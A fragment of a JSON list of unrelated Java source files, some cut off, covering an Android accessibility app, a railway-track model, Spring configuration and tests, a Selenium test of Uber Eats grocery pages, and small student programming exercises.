topK.size() < k; pos--) {\n            if (bucket[pos] != null) {\n                topK.addAll(bucket[pos]);\n            }\n        }\n\n        return topK.stream().mapToInt(i -> i).toArray();\n\n    }\n\n}",
    "package com.magicianguo.accessibilitytools.activity;\n\nimport android.content.Intent;\nimport android.os.Bundle;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport com.magicianguo.accessibilitytools.R;\nimport com.magicianguo.accessibilitytools.databinding.ActivityMainBinding;\nimport com.magicianguo.accessibilitytools.util.AlertManager;\nimport com.magicianguo.accessibilitytools.util.PermissionUtils;\nimport com.magicianguo.accessibilitytools.util.ToastUtils;\n\npublic class MainActivity extends AppCompatActivity {\n    private ActivityMainBinding binding;\n    private final AlertManager.AlertStateListener mAlertStateListener = new AlertManager.AlertStateListener() {\n        @Override\n        public void onViewExplorer(boolean showing) {\n            updateBtnViewExplorerState(showing);\n        }\n\n        @Override\n        public void onTurnPage(boolean showing) {\n            updateBtnTurnPageState(showing);\n        }\n\n        @Override\n        public void onClickTools(boolean showing) {\n            updateBtnClickToolsState(showing);\n        }\n    };\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        binding = ActivityMainBinding.inflate(getLayoutInflater());\n        setContentView(binding.getRoot());\n\n        PermissionUtils.checkNotificationPermission(this);\n        initView();\n        AlertManager.setAlertStateListener(mAlertStateListener);\n    }\n\n    @Override\n    protected void onResume() {\n        super.onResume();\n        updateAccessibilityState();\n    }\n\n    @Override\n    protected void onDestroy() {\n        super.onDestroy();\n        AlertManager.setAlertStateListener(null);\n        binding = null;\n    }\n\n    private void initView() {\n        updateBtnViewExplorerState(AlertManager.isViewExplorerViewShowing);\n        updateBtnTurnPageState(AlertManager.isTurnPageViewShowing);\n        updateBtnClickToolsState(AlertManager.isClickToolsViewShowing);\n        binding.btnGoAccessibility.setOnClickListener(v -> {\n            PermissionUtils.goAccessibilityPage(this);\n            ToastUtils.shortCall(R.string.toast_please_select_my_app);\n        });\n        binding.btnGoAppDetail.setOnClickListener(v -> {\n            PermissionUtils.goAppDetailPage(this);\n        });\n        binding.btnViewExplorer.setOnClickListener(v -> {\n            if (checkAlertPermission()) {\n                boolean selected = v.isSelected();\n                if (selected) {\n                    AlertManager.hideViewExplorerView();\n                } else {\n                    AlertManager.showViewExplorerView();\n                }\n                updateBtnViewExplorerState(!selected);\n            }\n        });\n        binding.btnTurnPage.setOnClickListener(v -> {\n            if (checkAlertPermission()) {\n                boolean selected = v.isSelected();\n                if (selected) {\n                    AlertManager.hideTurnPageView();\n                } else {\n                    AlertManager.showTurnPageView();\n                }\n                updateBtnTurnPageState(!selected);\n            }\n        });\n        binding.btnClickTools.setOnClickListener(v -> {\n            if (checkAlertPermission()) {\n                boolean selected = v.isSelected();\n                if (selected) {\n                    AlertManager.hideClickToolsView();\n                } else {\n                    AlertManager.showClickToolsView();\n                }\n                updateBtnClickToolsState(!selected);\n            }\n        });\n        binding.btnPalette.setOnClickListener(v -> {\n            Intent intent = new Intent(this, PaletteActivity.class);\n            startActivity(intent);\n        });\n        binding.btnSetting.setOnClickListener(v -> {\n            Intent intent = new Intent(this, SettingActivity.class);\n            startActivity(intent);\n        });\n    }\n\n    private void updateBtnViewExplorerState(boolean showing) {\n        if (showing) {\n            binding.btnViewExplorer.setSelected(true);\n            binding.btnViewExplorer.setText(R.string.view_explorer_tools_on);\n        } else {\n            binding.btnViewExplorer.setSelected(false);\n            binding.btnViewExplorer.setText(R.string.view_explorer_tools_off);\n        }\n    }\n\n    private void updateBtnTurnPageState(boolean showing) {\n        if (showing) {\n            binding.btnTurnPage.setSelected(true);\n            binding.btnTurnPage.setText(R.string.turn_page_tools_on);\n        } else {\n            binding.btnTurnPage.setSelected(false);\n            binding.btnTurnPage.setText(R.string.turn_page_tools_off);\n        }\n    }\n\n    private void updateBtnClickToolsState(boolean showing) {\n        if (showing) {\n            binding.btnClickTools.setSelected(true);\n            binding.btnClickTools.setText(R.string.click_tools_on);\n        } else {\n            binding.btnClickTools.setSelected(false);\n            binding.btnClickTools.setText(R.string.click_tools_off);\n        }\n    }\n\n    private void updateAcces",
    "package de.stsFanGruppe.templatebuilder.strecken;\r\n\r\nimport java.util.*;\r\nimport de.stsFanGruppe.tools.NullTester;\r\n\r\npublic class Gleis\r\n{\r\n\tprotected static org.slf4j.Logger log = org.slf4j.LoggerFactory.getLogger(Gleis.class);\r\n\t\r\n\tprotected String name;\r\n\tprotected NavigableSet<Gleisabschnitt> gleisabschnitte;\r\n\tprotected boolean verwendetGleisabschnitte;\r\n\tprotected Betriebsstelle parent;\r\n\t\r\n\t/**\r\n\t * Erstellt ein Gleis ohne Gleisabschnitte.\r\n\t * \r\n\t * @param name der Name des Gleises.\r\n\t */\r\n\tpublic Gleis(String name, double km)\r\n\t{\r\n\t\tthis.setName(name);\r\n\t\tthis.resetGleisabschnitte(km);\r\n\t}\r\n\t\r\n\t/**\r\n\t * Erstellt ein Gleis mit den gegebenen Gleisabschnitten.\r\n\t * \r\n\t * @param name der Name des Gleises.\r\n\t * @param gleisabschnitte die Gleisabschnitte, die das Gleis umfasst.\r\n\t * @thows NullPointerException falls die Liste der Gleisabschnitte null ist.\r\n\t */\r\n\tprotected Gleis(String name, Collection<? extends Gleisabschnitt> gleisabschnitte)\r\n\t{\r\n\t\tthis.setName(name);\r\n\t\tthis.addGleisabschnitte(gleisabschnitte);\r\n\t}\r\n\t\r\n\tpublic String getName()\r\n\t{\r\n\t\treturn name;\r\n\t}\r\n\t\r\n\tpublic void setName(String name)\r\n\t{\r\n\t\tNullTester.test(name);\r\n\t\tthis.name = name;\r\n\t}\r\n\t\r\n\tpublic boolean hasGleisabschnitte()\r\n\t{\r\n\t\treturn verwendetGleisabschnitte;\r\n\t}\r\n\t\r\n\tpublic NavigableSet<Gleisabschnitt> getGleisabschnitte()\r\n\t{\r\n\t\treturn gleisabschnitte;\r\n\t}\r\n\t\r\n\tpublic void addGleisabschnitt(Gleisabschnitt gleisabschnitt)\r\n\t{\r\n\t\tNullTester.test(gleisabschnitt);\r\n\t\t\r\n\t\tif(!this.verwendetGleisabschnitte)\r\n\t\t{\r\n\t\t\t// Aufr\u00e4umen\r\n\t\t\tGleisabschnitt alt = this.gleisabschnitte.first();\r\n\t\t\t\r\n\t\t\tif(alt.getParent() != this)\r\n\t\t\t{\r\n\t\t\t\tlog.error(\"Dummy-Gleisabschnitt {} aus Gleis {} l\u00f6schen: bin nicht parent!\", alt.getName(), getName());\r\n\t\t\t\tthrow new IllegalStateException(\"Interner Gleisabschnitt asynchron!\");\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\talt.setParent(null);\r\n\t\t\tthis.gleisabschnitte.clear();\r\n\t\t}\r\n\t\t\r\n\t\t// Parent pr\u00fcfen und setzten\r\n\t\tif(gleisabschnitt.getParent() != null)\r\n\t\t{\r\n\t\t\tlog.error(\"addGleisabschnitt: Gleisabschnitt hat schon parent: \" + gleisabschnitt.getParent().getName());\r\n\t\t\tthrow new IllegalStateException(\"Gleisabschnitt wird schon verwendet!\");\r\n\t\t}\r\n\t\t\r\n\t\tthis.gleisabschnitte.add(gleisabschnitt);\r\n\t\tgleisabschnitt.setParent(this);\r\n\t\tthis.verwendetGleisabschnitte = true;\r\n\t}\r\n\t\r\n\tprotected void addGleisabschnitte(Collection<? extends Gleisabschnitt> gleisabschnitte)\r\n\t{\r\n\t\tNullTester.test(gleisabschnitte);\r\n\t\tgleisabschnitte.forEach((Gleisabschnitt g) -> this.addGleisabschnitt(g));\r\n\t}\r\n\t\r\n\tpublic boolean removeGleisabschnitt(Gleisabschnitt gleisabschnitt)\r\n\t{\r\n\t\tNullTester.test(gleisabschnitt);\r\n\t\tif(!this.verwendetGleisabschnitte || !gleisabschnitte.contains(gleisabschnitt))\r\n\t\t{\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\t\r\n\t\tif(gleisabschnitt.getParent() == this)\r\n\t\t{\r\n\t\t\tgleisabschnitt.setParent(null);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tlog.error(\"Gleisabschnitt {} aus Gleis {} l\u00f6schen: bin nicht parent!\", gleisabschnitt.getName(), getName());\r\n\t\t\tthrow new IllegalStateException(\"Gleisabschnitt asynchron!\");\r\n\t\t}\r\n\t\tboolean erfolg = this.gleisabschnitte.remove(gleisabschnitt);\r\n\t\t\r\n\t\tif(this.gleisabschnitte.isEmpty())\r\n\t\t{\r\n\t\t\tthis.resetGleisabschnitte(gleisabschnitt.getKm());\r\n\t\t}\r\n\t\treturn erfolg;\r\n\t}\r\n\t\r\n\tpublic void resetGleisabschnitte(double km)\r\n\t{\r\n\t\tthis.gleisabschnitte = new TreeSet<>();\r\n\t\tthis.gleisabschnitte.add(new Gleisabschnitt(name, this, km));\r\n\t\tthis.verwendetGleisabschnitte = false;\r\n\t}\r\n\t\r\n\tpublic Betriebsstelle getParent()\r\n\t{\r\n\t\treturn parent;\r\n\t}\r\n\t\r\n\tvoid setParent(Betriebsstelle parent)\r\n\t{\r\n\t\tthis.parent = parent;\r\n\t}\r\n\t\r\n\tpublic double getMinKm()\r\n\t{\r\n\t\treturn gleisabschnitte.stream().min((a, b) -> Double.compare(a.getKm(), b.getKm())).get().getKm();\r\n\t}\r\n\t\r\n\tpublic double getMaxKm()\r\n\t{\r\n\t\treturn gleisabschnitte.stream().min((a, b) -> Double.compare(a.getKm(), b.getKm())).get().getKm();\r\n\t}\r\n\t\r\n\tpublic String toString()\r\n\t{\r\n\t\tif(verwendetGleisabschnitte)\r\n\t\t{\r\n\t\t\treturn \"Gleis \" + getName();\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\treturn \"Gleis \" + getName() + \" { \" + gleisabschnitte.size() + \" Gleisabschnitte }\";\r\n\t\t}\r\n\t}\r\n\t\r\n\tpublic String toXML()\r\n\t{\r\n\t\treturn toXML(\"\");\r\n\t}\r\n\t\r\n\tpublic String toXML(String indent)\r\n\t{\r\n\t\tStringJoiner xml = new StringJoiner(\"\\n\");\r\n\t\txml.add(indent + \"<gleis name=\\\"\" + getName() + \"\\\">\");\r\n\t\t\r\n\t\tif(!gleisabschnitte.isEmpty())\r\n\t\t{\r\n\t\t\tfor(Gleisabschnitt ga : gleisabschnitte)\r\n\t\t\t{\r\n\t\t\t\txml.add(ga.toXML(indent + \"  \"));\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\txml.add(indent + \"</gleis>\");\r\n\t\treturn xml.toString();\r\n\t}\r\n}\r\n",
    "package com.example.offsideoutfits.config;\n\nimport jakarta.servlet.DispatcherType;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.http.HttpMethod;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.core.userdetails.User;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.provisioning.InMemoryUserDetailsManager;\nimport org.springframework.security.web.SecurityFilterChain;\n\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    @Bean\n    public UserDetailsService userDetailsService() {\n        InMemoryUserDetailsManager manager = new InMemoryUserDetailsManager();\n        manager.createUser(User.withDefaultPasswordEncoder()\n                .username(\"user\")\n                .password(\"password\")\n                .roles(\"USER\")\n                .build());\n        return manager;\n    }\n\n//    @Bean\n//    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n//        http\n//                .authorizeRequests()\n//                .dispatcherTypeMatchers(HttpMethod.POST, DispatcherType.valueOf(\"/TShirts\")).hasRole(\"USER\")\n//                .anyRequest().authenticated()\n//                .csrf((csrf)->csrf.disable());\n//        return http.build();\n//    }\n}",
    "package com.example.airankings.demo.web.util;\n\nimport com.alibaba.dashscope.aigc.generation.Generation;\nimport com.alibaba.dashscope.aigc.generation.GenerationParam;\nimport com.alibaba.dashscope.aigc.generation.GenerationResult;\nimport com.alibaba.dashscope.common.Message;\nimport com.alibaba.dashscope.common.Role;\nimport com.alibaba.dashscope.exception.ApiException;\nimport com.alibaba.dashscope.exception.InputRequiredException;\nimport com.alibaba.dashscope.exception.NoApiKeyException;\n\n\nimport java.util.Arrays;\n\n\npublic class TongYiQianWenUtil {\n\n\n    /*\n    * \u6b64Java\u51fd\u6570\u7684\u4e3b\u8981\u529f\u80fd\u662f\u5229\u7528\u9884\u5b9a\u4e49\u7684\u6d88\u606f\u6a21\u677f\u548c\u8f93\u5165\u53c2\u6570\uff08message\u3001tag\u3001count\uff09\u751f\u6210\u6587\u672c\uff0c\u5e76\u8fd4\u56de\u751f\u6210\u7684\u6587\u672c\u5185\u5bb9\u3002\n    * \u5b83\u901a\u8fc7\u521d\u59cb\u5316Generation\u7c7b\u5e76\u8bbe\u7f6e\u76f8\u5173\u53c2\u6570\u6765\u5b8c\u6210\u8fd9\u4e00\u8fc7\u7a0b\uff0c\u6700\u7ec8\u4ece\u751f\u6210\u7ed3\u679c\u4e2d\u63d0\u53d6\u5e76\u8fd4\u56de\u7b2c\u4e00\u6761\u6d88\u606f\u5185\u5bb9\u3002\n    * */\n    public  String callWithMessage(String message, String tag, String count)\n            throws NoApiKeyException, ApiException, InputRequiredException {\n        Generation gen = new Generation();\n        Message systemMsg = Message.builder().role(Role.SYSTEM.getValue())\n                .content(\"You are a helpful assistant.\").build();\n        Message userMsg =\n                Message.builder().role(Role.USER.getValue()).content(\"\u8bf7\u6309\u7167\u7ed9\u5b9a\u7684\u683c\u5f0f\u5217\u51fa\u6709\"+message+\"\u4e13\u4e1a\u7684\"+count+\"\u5bb6\u4ee5\u5185\u56fd\u5185\"+tag+\"\uff0c\u4e25\u683c\u6309\u7167\u6bcf\u884c\u53ea\u8f93\u51fa\u4e00\u6761\u5185\u5bb9\uff0c\u4e0d\u8981\u8f93\u51fa\u4efb\u4f55\u63d0\u793a\u8bcd\uff0c\u5185\u5bb9\u683c\u5f0f\u5982\u4e0b\uff1a\\\\n1\uff1a\u67d0\u67d0\u4f01\u4e1a\\\\n2\uff1a\u67d0\u67d0\u4f01\u4e1a\\\\n3\uff1a\u67d0\u67d0\u4f01\u4e1a\").build();\n        GenerationParam param = GenerationParam.builder().model(\"qwen-turbo\")\n                .messages(Arrays.asList(systemMsg, userMsg))\n                .resultFormat(GenerationParam.ResultFormat.MESSAGE).topP(0.8).build();\n        GenerationResult result = gen.call(param);\n        System.out.println(result.getOutput().getChoices().get(0).getMessage().getContent());\n        return result.getOutput().getChoices().get(0).getMessage().getContent();\n    }\n}\n",
    "import org.openqa.selenium.By;\nimport org.openqa.selenium.JavascriptExecutor;\nimport org.openqa.selenium.Keys;\nimport org.openqa.selenium.WebElement;\nimport org.openqa.selenium.interactions.Actions;\nimport org.testng.Assert;\nimport org.testng.annotations.Test;\n\nimport java.time.Duration;\n\npublic class Groceries extends Setup{\n\n    @Test(priority = 1)\n    void NavigateToGroceries() {\n        driver.findElement(By.xpath(\"//*[@id=\\\"main-content\\\"]/div/div[1]/div[2]/div/div[1]/li/a\")).click(); //grocery filter\n        wait(3000);\n        Assert.assertEquals(driver.getTitle(),\"Order Food Online | Food Delivery App | Uber Eats\");\n        Assert.assertEquals(driver.getCurrentUrl(),\"https://www.ubereats.com/category-feed/Shop?diningMode=DELIVERY&pl=JTdCJTIyYWRkcmVzcyUyMiUzQSUyMkZsb3JpZGElMjBHdWxmJTIwQ29hc3QlMjBVbml2ZXJzaXR5JTIyJTJDJTIycmVmZXJlbmNlJTIyJTNBJTIyaGVyZSUzQXBkcyUzQXBsYWNlJTNBODQwZGh0eWUtZTQ0NWUzZmM4ZDc2NGJjOGE0MTZhNGYyN2FhMmRiNWMlMjIlMkMlMjJyZWZlcmVuY2VUeXBlJTIyJTNBJTIyaGVyZV9wbGFjZXMlMjIlMkMlMjJsYXRpdHVkZSUyMiUzQTI2LjQ2MzY0JTJDJTIybG9uZ2l0dWRlJTIyJTNBLTgxLjc3MjU1JTdE\");\n        wait(4000);\n    }\n\n    @Test(priority = 2)\n    void FilterGroceryType(){ //Navigates to 3 different grocery pages then navigates back (due to no direct link)\n        driver.findElement(By.xpath(\"//a[contains(@href, '/search?q=Retail')]\")).click(); //Retail filter\n        wait(3000);\n        driver.navigate().back();\n        wait(4000);\n        driver.findElement(By.xpath(\"//li[.//a[@href='/search?q=Pharmacy']]\")).click(); //Pharmacy filter\n        wait(3000);\n        driver.navigate().back();\n        wait(5000);\n        driver.findElement(By.xpath(\"//li[.//img[contains(@src, 'onvenience')]]\")).click(); //convenience filter\n        wait(3000);\n    }\n\n    @Test(priority = 3)\n    void SelectGroceryStore(){\n        driver.findElement(By.id(\"search-suggestions-typeahead-input\")).sendKeys(\"waw\"); //Selects WAWA\n        wait(4000);\n        driver.findElement(By.id(\"search-suggestions-typeahead-input\")).sendKeys(Keys.ENTER); //hits the enter key to submit the string\n        wait(4000);\n        driver.findElement(By.id(\"search-suggestions-typeahead-input\")).click(); //Clicks again to access the item search result list\n        wait(4000);\n        driver.findElement(By.id(\"search-suggestions-typeahead-item-0\")).click(); //Uses the search listing as opposed to the restaurant card\n        Assert.assertEquals(driver.getCurrentUrl(),\"https://www.ubereats.com/store/wawa-5237-16971-aaron-warnek-pl/9ImCpSA0UhShMAm-_jLylA?sc=SEARCH_SUGGESTION\");\n    }\n\n    @Test(priority = 4)\n    void ShopByList(){\n        driver.findElement(By.xpath(\"//a[contains(@href, '#SHOP_YOUR_LIST')]\")).click(); // opens and selects grocery list\n        wait(4000);\n        driver.findElement(By.xpath(\"//div[contains(@data-baseweb, 'textarea')]\")).sendKeys(\"Slim Jim\"); //Adds Slim Jim to list\n        driver.findElement(By.xpath(\"//div[contains(@data-baseweb, 'textarea')]\")).sendKeys(Keys.ENTER);\n        wait(3000);\n        driver.findElement(By.xpath(\"//div[contains(@data-baseweb, 'textarea')]\")).sendKeys(\"Lay's Classic\"); //Adds Classic Lays to list\n        driver.findElement(By.xpath(\"//div[contains(@data-baseweb, 'textarea')]\")).sendKeys(Keys.ENTER);\n        wait(3000);\n        driver.findElement(By.xpath(\"//div[contains(@data-baseweb, 'textarea')]\")).sendKeys(\"Swedish Fish\"); //Adds Swedish Fish to list\n        driver.findElement(By.xpath(\"//div[contains(@data-baseweb, 'textarea')]\")).sendKeys(Keys.ENTER);\n        wait(3000);\n        driver.findElement(By.xpath(\"//div[contains(@data-baseweb, 'textarea')]\")).click(); //Submits list to shop\n        wait(4000);\n    }\n\n    @Test(priority = 5)\n    void AddListItemsToCart(){\n        driver.findElement(By.xpath(\"//*[@id=\\\"main-content\\\"]/div[3]/div/div[2]/div/div/div/div[2]/ul/li[1]/div/div/div[2]/ul/ul/li[1]/a/div/div[1]/div[3]/div/button\")).click(); //Adds slim jim to cart\n        wait(3000);\n        driver.findElement(By.xpath(\"//*[@id=\\\"main-content\\\"]/div[3]/div/div[2]/div/div/div/div[2]/ul/li[2]/div/div/div[2]/ul[1]/ul/li[1]/a/div/div[1]/div[3]/div/button\")).click(); //Adds Lays to cart\n        wait(3000);\n        JavascriptExecutor js = (JavascriptExecutor) driver;\n        js.executeScript(\"window.scrollBy(0,600)\", \"\"); //Scrolls down by 600 pixels\n        wait(3000);\n        driver.findElement(By.xpath(\"//*[@id=\\\"main-content\\\"]/div[3]/div/div[2]/div/div/div/div[2]/ul/li[3]/div/div/div[2]/ul/ul/li[1]/a/div/div[1]/div[3]/div/button\")).click(); //Adds swedish fish to cart\n        wait(3000);\n    }\n\n    @Test(priority = 6)\n    void DeleteShoppingList(){\n        JavascriptExecutor js = (JavascriptExecutor) driver;\n        js.executeScript(\"window.scrollBy(0,-600)\", \"\"); //Scrolls up by 600 pixels\n        wait(3000);\n        driver.findElement(By.xpath(\"//*[@id=\\\"main-content\\\"]/div[3]/div/div[1]/div[3]/div[1]/nav/ul/li[2]/a/div\")).click(); // opens and selects grocery list\n        wait(4000);\n        String selectall = Keys.",
    "import java.util.ArrayList;\r\nimport java.util.List;\r\n\r\nclass Project {\r\n    int completionTime;\r\n    int dueTime;\r\n\r\n    public Project(int completionTime, int dueTime) {\r\n        this.completionTime = completionTime;\r\n        this.dueTime = dueTime;\r\n    }\r\n}\r\n\r\npublic class ProjectCompletionStatus {\r\n\r\n    public static void main(String[] args) {\r\n        List<Project> projects = new ArrayList<>();\r\n        projects.add(new Project(5, 5));\r\n        projects.add(new Project(4, 5));\r\n        projects.add(new Project(6, 5));\r\n        projects.add(new Project(3, 5));\r\n        projects.add(new Project(5, 5));\r\n\r\n \r\n        int onTime = 0;\r\n        int late = 0;\r\n        int early = 0;\r\n        int totalCompletionTime = 0;\r\n\r\n        for (Project project : projects) {\r\n            if (project.completionTime == project.dueTime) {\r\n                onTime++;\r\n            } else if (project.completionTime < project.dueTime) {\r\n                early++;\r\n            } else {\r\n                late++;\r\n            }\r\n\r\n            totalCompletionTime += project.completionTime;\r\n        }\r\n\r\n        int numProjects = projects.size();\r\n        double avgCompletionTime = (double) totalCompletionTime / numProjects;\r\n\r\n     \r\n        System.out.println(\"On time: \" + onTime);\r\n        System.out.println(\"Late: \" + late);\r\n        System.out.println(\"Early: \" + early);\r\n        System.out.println(\"Average completion time: \" + avgCompletionTime);\r\n    }\r\n}\r\n",
    "package aeds3;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\n\npublic class ParIDEndereco implements RegistroHashExtensivel {\n\n  private int id;\n  private long endereco;\n  final private int TAMANHO = 12;\n\n  public ParIDEndereco() {\n    this(-1, -1);\n  }\n\n  public ParIDEndereco(int i, long e) {\n    this.id = i;\n    this.endereco = e;\n  }\n\n  public int getId() {\n    return id;\n  }\n\n  public long getEndereco() {\n    return endereco;\n  }\n\n  public int hashCode() {\n    return this.id;\n  }\n\n  public short size() {\n    return TAMANHO;\n  }\n\n  public byte[] toByteArray() throws IOException {\n    ByteArrayOutputStream ba_out = new ByteArrayOutputStream();\n    DataOutputStream dos = new DataOutputStream(ba_out);\n    dos.writeInt(this.id);\n    dos.writeLong(this.endereco);\n    return ba_out.toByteArray();\n  }\n\n  public void fromByteArray(byte[] ba) throws IOException {\n    ByteArrayInputStream ba_in = new ByteArrayInputStream(ba);\n    DataInputStream dis = new DataInputStream(ba_in);\n    this.id = dis.readInt();\n    this.endereco = dis.readLong();\n  }\n\n}\n",
    "import javax.swing.JOptionPane;\n\npublic class Ejercicio {\n\n    public static void main(String[] args) {\n\n        int dec;\n        String binario, hex, oct;\n        boolean verificado;\n\n        do {\n            binario = JOptionPane.showInputDialog(\"Ingrese un n\u00famero binario:\");\n            verificado = true;\n\n            for (int i = 0; i < binario.length(); i++) {\n                if (binario.charAt(i) != '1' && binario.charAt(i) != '0') {\n                    verificado = false;\n                }\n            }\n\n            if (verificado == false) {\n                JOptionPane.showMessageDialog(null, \"N\u00daMERO INV\u00c1LIDO, INGRESE UNO V\u00c1LIDO\");\n            }\n\n        } while (verificado == false);\n\n        dec = (int) Long.parseLong(binario, 2);\n        oct = Integer.toOctalString(dec);\n        hex = Integer.toHexString(dec);\n\n        JOptionPane.showMessageDialog(null, \"El n\u00famero binario \" + binario + \" es:\\n\"\n                + \"en Decimal: \" + dec + \"\\nen Octal: \" + oct + \"\\nen Hexadecimal: \" + hex);\n\n    }\n}",
    "package com.vainaweb.schoolsystem.integration.student;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport org.flywaydb.core.Flyway;\nimport org.hamcrest.Matchers;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.http.MediaType;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.test.annotation.DirtiesContext;\nimport org.springframework.test.context.TestPropertySource;\nimport org.springframework.test.web.servlet.MockMvc;\nimport org.springframework.test.web.servlet.request.MockMvcRequestBuilders;\nimport org.springframework.test.web.servlet.result.MockMvcResultHandlers;\nimport org.springframework.test.web.servlet.result.MockMvcResultMatchers;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\n@SpringBootTest\n@TestPropertySource(locations = \"classpath:test.properties\")\n@AutoConfigureMockMvc\n@DirtiesContext\npublic class StudentUpdateTest {\n\n  @Autowired\n  private MockMvc mockMvc;\n\n  @Autowired\n  private ObjectMapper objectMapper;\n\n  @Autowired\n  private JdbcTemplate jdbcTemplate;\n\n  @Autowired\n  private Flyway flyway;\n\n  private Map<String, Object> body = new HashMap<>();\n\n  @BeforeEach\n  public void setup() {\n    jdbcTemplate.execute(\"DROP ALL OBJECTS DELETE FILES\");\n    flyway.migrate();\n  }\n\n  @Test\n  @DisplayName(\"Update Student Not Found\")\n  public void updateStudentNotFound() throws Exception {\n\n    mockMvc\n        .perform(MockMvcRequestBuilders.put(\"/estudantes/4\")\n            .contentType(MediaType.APPLICATION_JSON)\n            .content(objectMapper.writeValueAsString(body)))\n        .andDo(MockMvcResultHandlers.print())\n        .andExpect(MockMvcResultMatchers.status().isNotFound());\n  }\n\n  @Test\n  @DisplayName(\"Update Student Non Numeric Id\")\n  public void updateStudentNonNumericId() throws Exception {\n\n    mockMvc.perform(MockMvcRequestBuilders.put(\"/estudantes/a\")\n        .contentType(MediaType.APPLICATION_JSON)\n        .content(objectMapper.writeValueAsString(body)))\n        .andDo(MockMvcResultHandlers.print())\n        .andExpect(MockMvcResultMatchers.status().isBadRequest())\n        .andExpect(MockMvcResultMatchers.jsonPath(\"$.status\", Matchers.is(400)))\n        .andExpect(MockMvcResultMatchers.jsonPath(\"$.message\", Matchers.is(\"The parameter 'id' is missing.\")));\n  }\n\n  @Test\n  @DisplayName(\"Name Update Student Success\")\n  public void nameUpdateStudent() throws Exception {\n\n    body.put(\"name\", \"Jo\u00e3o da Silva\");\n\n    mockMvc.perform(MockMvcRequestBuilders.put(\"/estudantes/1\")\n        .contentType(MediaType.APPLICATION_JSON)\n        .content(objectMapper.writeValueAsString(body))\n        .header(\"If-Match\", \"adc41273\"))\n        .andExpect(MockMvcResultMatchers.status().isNoContent())\n        .andExpect(MockMvcResultMatchers.header().string(\"ETag\", Matchers.containsString(\"d617296b\")));\n  }\n\n  @Test\n  @DisplayName(\"Name Update Student If-Match non match\")\n  public void nameUpdateStudentNonMatch() throws Exception {\n\n    body.put(\"name\", \"Jo\u00e3o da Silva\");\n\n    mockMvc.perform(MockMvcRequestBuilders.put(\"/estudantes/1\")\n        .contentType(MediaType.APPLICATION_JSON)\n        .content(objectMapper.writeValueAsString(body))\n        .header(\"If-Match\", \"a\"))\n        .andExpect(MockMvcResultMatchers.status().isBadRequest())\n        .andExpect(MockMvcResultMatchers.jsonPath(\"$.status\").value(400))\n        .andExpect(\n            MockMvcResultMatchers.jsonPath(\"$.message\").value(\"the received ETag does not match the current ETag\"))\n        .andExpect(MockMvcResultMatchers.jsonPath(\"$.timestamp\").exists());\n  }\n\n  @Test\n  @DisplayName(\"Name Update Student is blank\")\n  public void nameUpdateStudentIsBlank() throws Exception {\n\n    body.put(\"name\", \"\");\n\n    mockMvc.perform(MockMvcRequestBuilders.put(\"/estudantes/1\")\n        .contentType(MediaType.APPLICATION_JSON)\n        .content(objectMapper.writeValueAsString(body))\n        .header(\"If-Match\", \"adc41273\"))\n        .andExpect(MockMvcResultMatchers.status().isBadRequest())\n        .andExpect(MockMvcResultMatchers.jsonPath(\"$.status\").value(400))\n        .andExpect(MockMvcResultMatchers.jsonPath(\"$.message.name\").value(\"must not be blank\"))\n        .andExpect(MockMvcResultMatchers.jsonPath(\"$.timestamp\").exists());\n  }\n\n  @Test\n  @DisplayName(\"update Student with course is invalid\")\n  public void updateStudentWithCourseBlank() throws Exception {\n    body.put(\"course\", \"\");\n    mockMvc.perform(MockMvcRequestBuilders.put(\"/estudantes/1\")\n        .contentType(MediaType.APPLICATION_JSON)\n        .content(objectMapper.writeValueAsString(body)))\n        .andExpect(MockMvcResultMatchers.status().isBadRequest())\n        .andExpect(MockMvcResultMatchers.jsonPath(\"$.status\").value(400))\n        .andExpect(MockMvcResultMatchers.jsonP",
    "public class Hosteller extends Student {\r\n    private int roomNumber;\r\n    private char blockName;\r\n    private String roomType;\r\n\r\n    // Constructor\r\n    public Hosteller(int studentId, String studentName, String department, String gender, String category, double collegeFee,\r\n                     int roomNumber, char blockName, String roomType) {\r\n        super(studentId, studentName, department, gender, category, collegeFee);\r\n        this.roomNumber = roomNumber;\r\n        this.blockName = blockName;\r\n        this.roomType = roomType;\r\n    }\r\n\r\n    // Getters and Setters\r\n    public int getRoomNumber() {\r\n        return roomNumber;\r\n    }\r\n\r\n    public void setRoomNumber(int roomNumber) {\r\n        this.roomNumber = roomNumber;\r\n    }\r\n\r\n    public char getBlockName() {\r\n        return blockName;\r\n    }\r\n\r\n    public void setBlockName(char blockName) {\r\n        this.blockName = blockName;\r\n    }\r\n\r\n    public String getRoomType() {\r\n        return roomType;\r\n    }\r\n\r\n    public void setRoomType(String roomType) {\r\n        this.roomType = roomType;\r\n    }\r\n\r\n    // Calculate total fee method\r\n    public double calculateTotalFee() {\r\n        double hostelFee = 0;\r\n        \r\n        // Calculate hostel fee based on blockName and roomType\r\n        switch (blockName) {\r\n            case 'A':\r\n                hostelFee = roomType.equals(\"AC\") ? 8000 : 60000;\r\n                break;\r\n            case 'B':\r\n                hostelFee = roomType.equals(\"AC\") ? 5000 : 50000;\r\n                break;\r\n            case 'C':\r\n                hostelFee = roomType.equals(\"AC\") ? 